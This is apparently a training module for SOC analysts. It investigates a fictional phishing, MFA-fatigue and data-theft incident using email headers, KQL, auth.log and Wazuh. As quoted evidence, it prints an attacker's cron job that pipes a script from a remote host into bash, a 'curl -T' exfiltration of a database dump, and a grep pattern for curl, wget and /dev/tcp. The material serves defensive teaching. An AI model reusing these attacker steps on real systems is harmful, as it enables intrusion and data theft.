## What this module covers

The first scenario is the most common start of a serious incident: one click on a phishing link, a stolen password and an account that opens both the cloud and internal servers to the attacker. It covers the four objectives of domain 1:

- **1.1** Phishing analysis: email headers, SPF/DKIM/DMARC, URLs and attachments as IOCs.
- **1.2** Sign-in investigation in KQL: impossible travel, MFA fatigue, suspicious IP addresses and session theft.
- **1.3** Lateral movement and persistence on a Linux host: `auth.log`, Wazuh alerts, `authorized_keys`, cron.
- **1.4** Containing the account and host, timeline and incident report.

After the module you can get from one user sign-in to every system the attacker touched, moving from one log source to another through a shared value (IP address, user name, time, key).

## The story: Drina Logistika, Tuesday 13 October 2026

**Drina Logistika d.o.o.** is a company of about 200 employees. Identity lives in **Microsoft Entra ID** (Microsoft 365, MFA with push notifications in Microsoft Authenticator). Remote access goes through an **OpenVPN** server that signs users in through Entra ID (SAML). Linux servers are joined to the Active Directory domain through **SSSD**, so a user has the same password for Microsoft 365 and for SSH. Administrators log in to **jump01** (10.20.0.10) and from there to **db01** (10.20.0.31, PostgreSQL with the `crm` database) and other servers. The servers run a **Wazuh** agent (auth.log, FIM over `/home/*/.ssh` and crontabs).

People:

| Person | Role |
|---|---|
| Jelena Kovač (`jelena.kovac@drinalog.example`, Linux `jkovac`) | infrastructure engineer with access to VPN, jump01 and db01 |
| Helpdesk | receives the report and opens ticket HD-48213 |
| SOC on-call (you) | investigation, containment, report |
| Dragan Nikolić | Entra ID administrator |

### Attack timeline (UTC)

| Time | Event | Source of evidence |
|---|---|---|
| 07:42:10 | The email "Urgent: confirm MFA registration by 12:00" arrives from 198.51.100.61 | `Received`, `Authentication-Results` |
| ~07:58 | Jelena clicks the link and types her password on the fake page | ticket (local time) |
| 08:03:12 | First sign-in attempt from 203.0.113.77 (NL) with the correct password: `50074` | `SigninLogs` |
| 08:03–08:11 | Seven denied MFA prompts (`500121`) | `SigninLogs` |
| 08:12:05 | Jelena approves the eighth prompt: the attacker signs in successfully | `SigninLogs` |
| 08:15:02 | The attacker registers their own Authenticator on Jelena's account | `AuditLogs` |
| 08:20:44 | Sign-in to the "Drina VPN" application; the VPN assigns 10.8.0.23 | `SigninLogs`, `vpn.log` |
| 08:24:02 | `Accepted password for jkovac from 10.8.0.23` on jump01 | `auth.log`, Wazuh 5715 |
| 08:26:41 | `/home/jkovac/.ssh/authorized_keys` modified | Wazuh FIM 550 |
| 08:27:15 | The `jkovac` crontab modified (`curl ... \| bash` every 20 minutes) | `auth.log`, Wazuh 2832 |
| 08:30:58 | SSH from jump01 to db01 with the key `jkovac@jump01` | `auth.log` on db01 |
| 08:33:40 | `sudo -u postgres pg_dump -d crm -f /tmp/.cache.sql` | `auth.log`, Wazuh 100310 |
| 08:36:31 | `scp` of the dump to jump01, then `curl -T` to 198.51.100.23 | `auth.log` on db01, `.bash_history` |
| 09:38 | Jelena reports the incident to the helpdesk (11:38 CEST) | ticket |

The ticket and the `Date` header are in local time (CEST, UTC+2); all logs are in UTC. The first thing you do in every investigation is to bring everything to **UTC**.

## Attack chain and MITRE ATT&CK

| Step | Technique | Tactic |
|---|---|---|
| Email with a link to a fake sign-in page | **T1566.002** Phishing: Spearphishing Link | Initial Access |
| Sign-in with the stolen password | **T1078** Valid Accounts (T1078.004 Cloud Accounts) | Initial Access, Persistence |
| Flooding the user with MFA prompts | **T1621** Multi-Factor Authentication Request Generation | Credential Access |
| Registering the attacker's Authenticator | **T1098.005** Account Manipulation: Device Registration | Persistence |
| Using the session without a new MFA | **T1550.004** Use Alternate Authentication Material: Web Session Cookie | Defense Evasion, Lateral Movement |
| VPN through the stolen account | **T1133** External Remote Services | Initial Access, Persistence |
| SSH to jump01 and db01 | **T1021.004** Remote Services: SSH | Lateral Movement |
| A key in `authorized_keys` | **T1098.004** Account Manipulation: SSH Authorized Keys | Persistence |
| A cron job that downloads a script | **T1053.003** Scheduled Task/Job: Cron | Persistence, Execution |
| A private key left on jump01 | **T1552.004** Unsecured Credentials: Private Keys | Credential Access |
| `pg_dump` of the database | **T1005** Data from Local System | Collection |
| `curl -T` to the attacker's server | **T1041** Exfiltration Over C2 Channel | Exfiltration |

The mapping is not a formality: every technique has a page with data sources and detections, so the table immediately shows which log should have raised an alert.

## Evidence by source

### The email: headers and authentication

In the `.eml` file you read the headers **from the bottom up**: every server adds its own `Received` on top. You trust only headers added by your own servers (`mx01`); anything below can be invented by the attacker.

```text
Received: from mail.drinalog-sso.example (mail.drinalog-sso.example [198.51.100.61])
	by mx01.drinalog.example (Postfix) with ESMTPS id 4Hq2Lk0Zc9z9sWX
Authentication-Results: mx01.drinalog.example;
	spf=pass (sender IP is 198.51.100.61) smtp.mailfrom=mail.drinalog-sso.example;
	dkim=pass (2048-bit key) header.d=drinalog-sso.example header.s=s1 header.b=Qm3k9X2a;
	dmarc=fail (p=none dis=none) header.from=drinalog.example
From: "Drina IT podrska" <it-podrska@drinalog.example>
Reply-To: <it-podrska@drinalog-sso.example>
```

| Check | What it checks | Result here |
|---|---|---|
| **SPF** | whether the IP address may send for the envelope sender domain (`MAIL FROM`, `Return-Path`) | `pass` for `mail.drinalog-sso.example`: the attacker set up SPF for their own domain |
| **DKIM** | a signature over headers and body with the key of domain `d=` | `pass` for `drinalog-sso.example`: the attacker signs with their own key |
| **DMARC** | whether the domain that passed SPF or DKIM **matches** (alignment) the `From` domain | `fail`: `From` is `drinalog.example`, while other domains passed |

The key lesson: `spf=pass` and `dkim=pass` do not mean the message is legitimate, only that the sending domain is authentic. DMARC is the only one that ties authentication to the address the user sees. Drina Logistika has `p=none` (reports only), so a message with a spoofed `From` was delivered. With `p=quarantine` or `p=reject` it would have been quarantined or rejected.

Other signals in the message: `Reply-To` pointing to another domain, `X-Mailer: PHPMailer`, a `Message-ID` with the attacker's domain, displayed link text (`login.microsoftonline.com`) that differs from the `href` (`login.drinalog-sso.example`), urgency and the threat of blocking. The attachment `MFA-registracija.htm` is HTML that redirects to the same host: HTML attachments pass filters that block executables.

IOCs are extracted without opening the message in a mail client:

```bash
grep -nE '^(Received|Authentication-Results|From|Reply-To|Return-Path):' -A3 hitno-mfa.eml
python3 -c 'import email,hashlib,sys
m=email.message_from_file(open(sys.argv[1]))
for p in m.walk():
    if p.get_filename(): print(p.get_filename(), hashlib.sha256(p.get_payload(decode=True)).hexdigest())' hitno-mfa.eml
```

The IOC list for this phase: IP 198.51.100.61, the domain `drinalog-sso.example` (and the subdomains `mail.`, `login.`), the URL, the SHA-256 of the attachment, the `Subject` and the `Message-ID`. With them, in Defender for Office 365 you search for who else received the message (`EmailEvents`, `EmailUrlInfo`) and delete it from all mailboxes (Content search or *Take action* in Threat Explorer).

### SigninLogs: MFA fatigue, impossible travel, session

For Entra ID sign-ins the most important fields are `ResultType` (0 = success), `IPAddress`, `Location`, `AppDisplayName`, `AuthenticationRequirement`, `UserAgent` and `SessionId`.

| `ResultType` | Meaning |
|---|---|
| `0` | successful sign-in |
| `50074` | a strong (MFA) factor is required; a normal interrupt before the MFA step |
| `500121` | MFA failed: the user denied the prompt or did not confirm it in time |
| `50126` | wrong user name or password |
| `50140` | "Keep me signed in" interrupt |
| `53003` | the sign-in was blocked by Conditional Access |

The MFA fatigue pattern is a series of `500121` from the same IP address in a short time, followed by a success. Important: `500121` means the **password was correct**. The attacker has already passed the first factor.

```kql
SigninLogs
| where ResultType == 500121
| summarize MfaDenied = count(), First = min(TimeGenerated), Last = max(TimeGenerated)
    by UserPrincipalName, IPAddress
| where MfaDenied >= 5
```

You find the success after a series of denials by joining the two sets:

```kql
let denied = SigninLogs
| where ResultType == 500121
| summarize MfaDenied = count(), LastDenied = max(TimeGenerated) by UserPrincipalName, IPAddress
| where MfaDenied >= 5;
SigninLogs
| where ResultType == 0
| join kind=inner denied on UserPrincipalName, IPAddress
| where TimeGenerated > LastDenied
| project TimeGenerated, UserPrincipalName, IPAddress, AppDisplayName, MfaDenied
```

**Impossible travel**: two successful sign-ins by the same user from different countries in less time than the flight between them. In KQL you sort by user and time and compare each row with the previous one:

```kql
SigninLogs
| where ResultType == 0
| project TimeGenerated, UserPrincipalName, Location, IPAddress
| order by UserPrincipalName asc, TimeGenerated asc
| extend PrevUser = prev(UserPrincipalName), PrevLoc = prev(Location), PrevTime = prev(TimeGenerated)
| where PrevUser == UserPrincipalName and PrevLoc != Location
| extend Minutes = datetime_diff('minute', TimeGenerated, PrevTime)
| where Minutes < 180
```

Jelena is in Belgrade (RS) at 07:51, in Amsterdam (NL) at 08:12 and back in Belgrade at 08:40: 21 minutes for 1,400 km. Milica Savić is in Munich (DE) on 12 October and in Belgrade on the 13th, 16 hours apart: that is a business trip, not an attack. You always check impossible travel against VPN egress points, mobile carriers and known trips.

**Session theft.** All attacker sign-ins have the same `SessionId`, and after the first one they have `AuthenticationRequirement == "singleFactorAuthentication"`: the MFA requirement is satisfied by a claim in the session token. With classic password phishing (as here) the attacker gets the session by having MFA approved. With **AiTM** phishing (adversary-in-the-middle, e.g. Evilginx) the fake page proxies the real sign-in and steals the session cookie, so there is no MFA fatigue at all: you see a successful MFA sign-in from the proxy's IP address and then the same session from another address. In both cases **a password reset does not end existing sessions**: you must revoke them.

```kql
SigninLogs
| where IPAddress == "203.0.113.77" and ResultType == 0
| project TimeGenerated, AppDisplayName, AuthenticationRequirement, SessionId
| order by TimeGenerated asc
```

In a real Sentinel workspace token-based sign-ins are often in the `AADNonInteractiveUserSignInLogs` table; investigate both (`union SigninLogs, AADNonInteractiveUserSignInLogs`).

### AuditLogs: what the attacker changed in the identity

With a session, the attacker first secures a way back: registers their MFA device, adds mailbox forwarding rules, consents to an OAuth application. In `AuditLogs` you look for changes initiated by the compromised account or coming from the attacker's IP address:

```kql
AuditLogs
| where InitiatedByIP == "203.0.113.77"
    or (InitiatedByUser == "jelena.kovac@drinalog.example" and TimeGenerated > datetime(2026-10-13 08:00))
| project TimeGenerated, OperationName, TargetUser, AdditionalDetails
```

In the lab the table is simplified; in Sentinel `InitiatedBy` and `TargetResources` are dynamic fields (`tostring(InitiatedBy.user.userPrincipalName)`, `tostring(InitiatedBy.user.ipAddress)`). The operation `User registered security info` at 08:15:02 from the attacker's address means the attacker has **their own** second factor: if you only reset the password, they will steal it again and pass MFA without Jelena.

### The VPN log: a bridge between the cloud and the network

The attacker's sign-ins include `Drina VPN`. The VPN log ties the public IP address to an internal one:

```bash
grep 203.0.113.77 vpn.log
# ... jelena.kovac@drinalog.example/203.0.113.77:51844 MULTI_sva: pool returned IPv4=10.8.0.23
```

From that moment the attacker is on the internal network as **10.8.0.23**. Without this step, in `auth.log` you would see only the internal address and conclude that Jelena was working from home. The pivot is always the same: find the field two sources share (here the IP address and time) and cross over it.

### auth.log on jump01 and db01

```bash
grep -E 'Accepted|Failed|Invalid user' jump01-auth.log
grep -E 'sudo:|crontab\[' jump01-auth.log
grep 'session opened for user jkovac' jump01-auth.log
```

```text
Oct 12 17:44:03 jump01 sshd[40980]: Accepted publickey for jkovac from 10.8.0.14 port 50877 ssh2: ED25519 SHA256:cXDy...
Oct 13 08:24:02 jump01 sshd[48121]: pam_sss(sshd:auth): authentication success; ... rhost=10.8.0.23 user=jkovac
Oct 13 08:24:02 jump01 sshd[48121]: Accepted password for jkovac from 10.8.0.23 port 50122 ssh2
Oct 13 08:27:15 jump01 crontab[48190]: (jkovac) REPLACE (jkovac)
Oct 13 08:40:01 jump01 CRON[48402]: pam_unix(cron:session): session opened for user jkovac(uid=1003) by (uid=0)
```

Jelena normally logs in with a **key** (`Accepted publickey`); the attacker has only the password, so the log says `Accepted password` through `pam_sss`. A change of authentication method for the same account is a strong signal. `crontab ... REPLACE` is the trace of `crontab -` or `crontab -e`, and `CRON ... session opened for user jkovac` every 20 minutes shows that the attacker's job is running.

On db01 the login looks legitimate: `Accepted publickey for jkovac from 10.20.0.10` with the key `jkovac@jump01`, the same as the day before. The difference is the context: it comes three minutes after the attacker's login to jump01 and is followed by `sudo -u postgres pg_dump` into the hidden file `/tmp/.cache.sql`. A private key sitting on a jump host is the key to every server behind it.

`auth.log` has no year and no time zone. Check the host's time zone (`timedatectl`, `/etc/timezone`) before you put a time in the timeline.

### Persistence on the host

Whoever has a shell with the user's rights leaves a way back where the user does not look:

```bash
ssh-keygen -lf /home/jkovac/.ssh/authorized_keys     # fingerprint and comment of every key
crontab -l -u jkovac; cat /var/spool/cron/crontabs/jkovac
ls -la /etc/cron.d /etc/cron.daily; systemctl list-timers --all
grep -nE 'curl|wget|base64|/dev/tcp' /home/*/.bashrc /home/*/.profile /etc/profile.d/*
find /home /etc /tmp /var/tmp -newermt '2026-10-13 08:20' -type f 2>/dev/null
```

The key comment (`deploy@build-07`) is chosen by the attacker and proves nothing; compare the keys against an inventory (which keys were issued to whom). The cron line `*/20 * * * * /bin/bash -c "curl -fsS http://198.51.100.23/k.sh | bash"` gives the attacker code execution even after you remove the key: the script on the server can put the key back within 20 minutes. That is why persistence is removed **all at once**, after evidence collection.

### Wazuh alerts

Alerts are one JSON object per line, so you filter them with `jq`:

```bash
jq -r 'select(.timestamp | startswith("2026-10-13")) | [.timestamp, .agent.name, .rule.id, .rule.level, .rule.description] | @tsv' wazuh-alerts.json
jq 'select(.syscheck.path != null) | {timestamp, path: .syscheck.path, event: .syscheck.event}' wazuh-alerts.json
jq -r 'select(.data.srcip == "10.8.0.23" or .data.dstuser == "jkovac") | .full_log' wazuh-alerts.json
```

Wazuh saw everything: the FIM change of `authorized_keys` (550, level 7), the crontab change (2832, level 5) and the local rule for `pg_dump` outside the backup window (100310, level 10). Nobody reacted because lower-level alerts went only to the index, and rule 100310 sent an email to a shared mailbox. A detection that does not reach a person or automation is not a detection.

## Decision points

**Is this an incident?** Yes, as soon as you see a successful sign-in from 203.0.113.77 after a series of denied MFA prompts and the registration of a new MFA method. You do not wait for lateral movement to be proven.

**Watch or contain immediately?** Sometimes the attacker is observed to uncover the full scope. Not here: the attacker has an active session, VPN and a cron job executing code, and the database has already been taken. Every minute gives them new actions. You contain immediately, but collect evidence from the host before you change it.

**What first?** The order closes doors from the widest to the narrowest:

1. **Revoke sessions** and temporarily block sign-in: this kills the token the attacker uses. A password reset alone does not.
2. **Reset the password**: the same password is valid for SSSD on Linux.
3. **Remove the attacker's MFA method**: otherwise they come back with the next stolen password.
4. **VPN and network**: terminate the VPN session 10.8.0.23, block 203.0.113.77 inbound and 198.51.100.23 outbound (C2 and exfiltration).
5. **Evidence from jump01 and db01** (live response, hash, chain of custody), then remove the key and the cron job.
6. **Rotate the key** `jkovac@jump01`: remove it from `authorized_keys` on all servers (db01, app01).

**Shut down jump01?** Not abruptly. Shutting down loses processes, network connections and the contents of `/tmp`. It is better to isolate it on the network (allow only the SOC) and collect evidence, then rebuild it from a known state.

**Notification.** The `crm` database contains customers' personal data. Under the Serbian Law on Personal Data Protection (and GDPR for EU customers) a breach is reported to the supervisory authority (in Serbia, the Commissioner) without undue delay and no later than 72 hours after becoming aware of it, unless it is unlikely to result in a risk to people's rights. Legal and the DPO join the team as soon as the `pg_dump` and the outbound traffic are confirmed.

## Containment, eradication, recovery

Identity (Microsoft Graph PowerShell):

```powershell
Update-MgUser -UserId jelena.kovac@drinalog.example -AccountEnabled:$false
Revoke-MgUserSignInSession -UserId jelena.kovac@drinalog.example
Get-MgUserAuthenticationMicrosoftAuthenticatorMethod -UserId jelena.kovac@drinalog.example
Remove-MgUserAuthenticationMicrosoftAuthenticatorMethod -UserId jelena.kovac@drinalog.example `
    -MicrosoftAuthenticatorAuthenticationMethodId <id of device SM-A546B>
```

In Entra ID Protection you mark the account as compromised (*Confirm user compromised*), which raises the user risk and triggers risk-based policies.

Host (after evidence collection with the script from course 07):

```bash
sha256sum /home/jkovac/.ssh/authorized_keys /var/spool/cron/crontabs/jkovac /home/jkovac/.bash_history > /root/dokazi/jump01-perzistencija.sha256
cp -a /home/jkovac/.ssh/authorized_keys /var/spool/cron/crontabs/jkovac /home/jkovac/.bash_history /root/dokazi/
usermod -L jkovac; pkill -KILL -u jkovac          # lock the account and kill its sessions
sed -i '/deploy@build-07/d' /home/jkovac/.ssh/authorized_keys
crontab -l -u jkovac | grep -v '198.51.100.23' | crontab -u jkovac -
iptables -I OUTPUT -d 198.51.100.23 -j DROP
```

Eradication means removing **everything** the attacker left and everything that enabled the attack: the key and cron job on jump01, the `jkovac@jump01` key on all servers, `/tmp/.cache.sql` on db01, and checking other hosts `jkovac` could reach (app01 from `~/.ssh/config`). If the attacker had `sudo` on jump01, the host is considered compromised to root level and is rebuilt.

Recovery: the account comes back with a new password and **phishing-resistant** MFA (a FIDO2 key or passkey), jump01 from a clean image, with heightened monitoring of the account and hosts for 30 days.

## Detections that would have caught it earlier

| Where | Control or detection | What it would have prevented or caught |
|---|---|---|
| Email | DMARC `p=reject` for `drinalog.example` | the message with a spoofed `From` would not have been delivered |
| Email | Safe Links, a warning for lookalike domains | the click on `drinalog-sso.example` |
| Identity | MFA with **number matching** and context (location, application) or FIDO2 | MFA fatigue does not work when the user must type the number from the screen |
| Identity | Conditional Access: VPN and admin access only from managed devices | the sign-in from the attacker's laptop |
| SIEM | Analytics rule: 5+ `500121` then success from the same IP address | an alert at 08:12, 12 minutes before SSH |
| SIEM | MFA method registration from an IP address never seen for the user | an alert at 08:15 |
| Linux | `PasswordAuthentication no` on jump01 | the stolen password would not have opened SSH |
| Linux | No private keys on the jump host (`ssh -J`, agent forwarding with confirmation or short-lived SSH certificates) | lateral movement to db01 |
| Wazuh | A high-level rule for FIM over `authorized_keys` and for `curl \| bash` in a crontab | an alert at 08:26 that pages the on-call |

An example Sentinel analytics rule for MFA fatigue (scheduled query, every 10 minutes over the last 30):

```kql
SigninLogs
| where TimeGenerated > ago(30m)
| summarize Denied = countif(ResultType == 500121), Success = countif(ResultType == 0),
            FirstSeen = min(TimeGenerated) by UserPrincipalName, IPAddress, Location
| where Denied >= 5 and Success >= 1
```

## Links to other courses

- [Security foundations: IAM](#/01-sigurnosni-temelji/m/03-iam): MFA factors, phishing-resistant MFA, sessions and tokens.
- [Security foundations: MITRE ATT&CK](#/01-sigurnosni-temelji/m/06-mitre-attack): the tactics and techniques of the attack chain.
- [Security foundations: Linux hardening](#/01-sigurnosni-temelji/m/01-linux-hardening): SSH configuration, `PasswordAuthentication`, keys.
- [Security+: Threats, actors and vectors](#/02-security-plus/m/03-prijetnje-akteri-vektori): phishing, BEC, social engineering.
- [Security+: Operations, controls and monitoring](#/02-security-plus/m/08-operacije-kontrole-i-monitoring): SPF, DKIM, DMARC and email security.
- [SC-200: KQL basics](#/08-sc200/m/01-kql-osnove) and [SC-200: Advanced KQL](#/08-sc200/m/02-kql-napredno): `summarize`, `join`, `prev()`, `let`.
- [SC-200: Detections](#/08-sc200/m/05-detekcije): analytics rules in Sentinel.
- [SC-200: Microsoft 365 investigations](#/08-sc200/m/09-microsoft-365-istrage): Purview Audit and Content search for phishing emails.
- [SC-200: Hunting in Sentinel](#/08-sc200/m/10-hunting-u-sentinelu): hunting queries over sign-ins.
- [Detection and response: Logs and telemetry](#/07-detekcija-i-odgovor/m/01-logovi-i-telemetrija): `auth.log`, rsyslog, time synchronization.
- [Detection and response: Wazuh rules](#/07-detekcija-i-odgovor/m/04-wazuh-pravila): local rules, FIM, alert levels.
- [Detection and response: Incident response](#/07-detekcija-i-odgovor/m/09-odgovor-na-incidente): live response, chain of custody.
- [Detection and response: Containment and runbooks](#/07-detekcija-i-odgovor/m/10-obuzdavanje-i-runbookovi): a runbook for a compromised account.
- [CySA+: Indicators](#/09-cysa/m/02-indikatori): IOCs and host and network indicators.
- [CySA+: Reporting](#/09-cysa/m/11-izvjestavanje): the structure of an incident report.
